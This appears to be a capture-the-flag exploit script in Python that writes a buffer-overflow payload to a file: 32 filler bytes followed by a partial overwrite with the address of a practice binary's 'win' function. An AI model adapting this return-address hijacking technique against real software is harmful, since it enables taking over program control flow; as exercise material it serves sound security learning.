#!/usr/bin/env python3

from struct import pack

payload = b'a' * 32

# The address of the function win
payload += pack("<B", 55)
payload += pack("<H", 0x1479)

with open("payload", "wb") as f:
    f.write(payload)